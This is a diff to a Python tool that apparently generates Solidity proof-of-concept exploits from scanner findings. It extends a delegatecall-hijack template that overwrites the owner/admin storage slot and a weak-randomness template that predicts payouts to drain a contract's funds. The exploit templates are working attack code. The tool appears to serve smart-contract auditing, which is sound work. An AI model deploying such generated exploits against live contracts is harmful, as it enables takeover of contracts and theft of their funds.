@@ -1002,17 +1002,25 @@ def _delegatecall(findings):
             call_args.append("0")
     sig_types = ",".join(parts)
     call = f"        t.{name}({', '.join(call_args)});"
+    slot = 0
+    try:
+        from trust404.layout import privileged_slot, pwn_hijack
+        slot = privileged_slot(findings.get("src") or "")
+        pwn_body = pwn_hijack(slot)
+    except Exception:
+        pwn_body = (
+            "    address public slot0;\n"
+            "    function hijack() external { slot0 = msg.sender; }\n"
+        )
     body = (
         "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
         "// we control, so our module runs in the target's storage context and\n"
-        "// overwrites slot 0 (owner/admin). No import needed.\n"
+        f"// overwrites slot {slot} (owner/admin). No import needed.\n"
         "interface ITarget {\n"
         f"    function {name}({sig_types}) external;\n"
         "}\n\n"
         "contract Pwn {\n"
-        "    // slot 0 aligns with the target's owner/admin slot under delegatecall\n"
-        "    address public slot0;\n"
-        "    function hijack() external { slot0 = msg.sender; }\n"
+        + pwn_body +
         "}\n\n"
         "contract Exploit {\n"
         "    function run(address _t) external payable {\n"
@@ -1063,12 +1071,21 @@ def _randomness(findings):
     else:
         pick = f"({rand_expr})"
         param = "uint256"
+    getters = []
+    try:
+        from trust404.layout import rewrite_mixed
+        pick, getters = rewrite_mixed(pick, findings.get("src") or "", obj="t")
+    except Exception:
+        getters = []
+    getter_ifaces = "".join(
+        f"    function {g}() external view returns (uint256);\n" for g in getters
+    )
     body = (
         "// Strategy: weak randomness — the payout is decided by block entropy\n"
-        "// the caller can read in the same transaction. We compute the exact\n"
-        "// same value and submit it as our guess, draining the house float.\n"
+        "// mixed with public nonce/seed we read off the target in the same tx.\n"
         "interface ITarget {\n"
         f"    function {name}({param} guess) external payable;\n"
+        + getter_ifaces +
         "}\n\n"
         "contract Exploit {\n"
         f"    uint256 constant ANTE = {ante};\n"
@@ -4615,8 +4632,16 @@ def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t
     leftover = [i for i in re.findall(r"[A-Za-z_]\w*", expr)
                 if i not in ("block","blockhash","uint256","uint","keccak256","abi","bytes32",
                              "true","false","prevrandao","timestamp","number","difficulty","encodePacked")]
+    extra_getters = []
     if leftover:
-        return None  # block/리터럴만으로 환원 안 됨 → 이 경로로는 못 풂
+        try:
+            from trust404.layout import rewrite_mixed, leftover_ids
+            expr, extra_getters = rewrite_mixed(expr, tb, obj="t")
+            leftover = leftover_ids(expr)
+        except Exception:
+            leftover = leftover
+        if leftover:
+            return None  # still not reducible
     _solcv, _evm = _solc_for(target_src)
     std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src}},
            "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
@@ -4633,8 +4658,10 @@ def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t
                 and len(e.get("outputs",[]))==1 and e["outputs"][0]["type"].startswith("uint")]
     fn = target_fn["name"]
     gexpr = expr if gtype != "bool" else "(" + expr + ")"
+    getter_ifaces = "".join(
+        f" function {g}() external view returns (uint256);" for g in extra_getters)
     attacker = (HEADER +
-        f"interface ITarget {{ function {fn}({gtype}) external; }}\n"
+        f"interface ITarget {{ function {fn}({gtype}) external;{getter_ifaces} }}\n"
         "contract Attacker {\n"
         "    ITarget t;\n"
         "    constructor(address _t) { t = ITarget(_t); }\n"
